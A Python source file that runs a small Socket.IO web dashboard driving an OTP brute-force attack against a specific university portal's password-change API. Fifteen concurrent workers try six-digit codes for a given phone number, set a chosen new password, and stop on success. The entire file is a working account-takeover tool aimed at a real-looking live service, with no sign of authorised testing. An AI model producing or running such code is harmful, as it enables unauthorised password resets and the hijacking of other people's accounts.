import socketio
import asyncio
import aiohttp
from aiohttp import web
import os

# ----- Socket.IO server -----
sio = socketio.AsyncServer(async_mode='aiohttp', cors_allowed_origins='*')
app = web.Application()
sio.attach(app)

# ----- OTP script config -----
URL = "https://sitareuniv.digiicampus.com/api/userManagement/change/password"
PHONE = "91-xxxxxxxxx"
NEW_PASSWORD = "Sitare@09099"
# List of server messages that should stop the workers
STOP_MESSAGES = [
    "Invalid request, Otp already used",
    "This is already used password"  # <-- new message to stop
]


START = 10000
END = 999999
CONCURRENT = 15
DELAY = 0.09

stop_event = asyncio.Event()
counter = START

# ----- OTP brute-force -----
async def otp_brute(session: aiohttp.ClientSession, otp_value: str):
    payload = {"phone": PHONE, "otp": otp_value, "newPassword": NEW_PASSWORD}
    try:
        async with session.put(URL, json=payload, timeout=10) as resp:
            text = await resp.text()
            return resp.status, text
    except Exception as e:
        print(f"[NETWORK ERROR] OTP={otp_value}: {e}")
        return None, None

# ----- Worker -----
async def worker(worker_id: int):
    global counter
    async with aiohttp.ClientSession() as session:
        while not stop_event.is_set():
            otp_value = None
            if counter <= END:
                otp_value = str(counter).zfill(6)
                counter += 1
            else:
                break

            status, text = await otp_brute(session, otp_value)
            snippet = str(text)[82:125] if text else ''
            print(f"[Worker-{worker_id}] OTP={otp_value} Status={status} Body snippet={snippet}")

            await sio.emit('log', {'otp': otp_value, 'response': snippet})

            if status is not None:
                if status not in (200, 400):
                    stop_event.set()
                    await sio.emit('finished', {'otp_used': otp_value, 'status': 'Stopped', 'message': f"Unexpected HTTP status {status}"})
                    break

            # Stop if server returns any STOP_MESSAGES
            if text:
                for msg in STOP_MESSAGES:
                    if msg.lower() in text.lower():
                        stop_event.set()
                        await sio.emit('finished', {'otp_used': otp_value, 'status': 'Stopped', 'message': msg})
                        return  # stop this worker immediately


            if status and 200 <= status < 300:
                stop_event.set()
                await sio.emit('finished', {'otp_used': otp_value, 'status': 'Success', 'message': f"HTTP {status}"})
                break

            await asyncio.sleep(DELAY)

# ----- Start all workers -----
async def start_workers():
    tasks = [asyncio.create_task(worker(i+1)) for i in range(CONCURRENT)]
    await asyncio.gather(*tasks)

# ----- Socket.IO events -----
@sio.event
async def connect(sid, environ):
    print('Client connected:', sid)

@sio.event
async def start(sid, data):
    global PHONE, NEW_PASSWORD, START, END, CONCURRENT, DELAY, counter, stop_event
    PHONE = data.get('phone', PHONE)
    NEW_PASSWORD = data.get('newPassword', NEW_PASSWORD)
    START = data.get('start', START)
    END = data.get('end', END)
    CONCURRENT = data.get('concurrent', CONCURRENT)
    DELAY = data.get('delay', DELAY)
    counter = START
    stop_event.clear()
    asyncio.create_task(start_workers())

@sio.event
async def stop(sid):
    stop_event.set()

# ----- Serve index.html -----
async def index(request):
    return web.FileResponse(os.path.join('templates', 'index.html'))

app.router.add_get('/', index)

# ----- Run server -----
if __name__ == "__main__":
    web.run_app(app, port=5000)
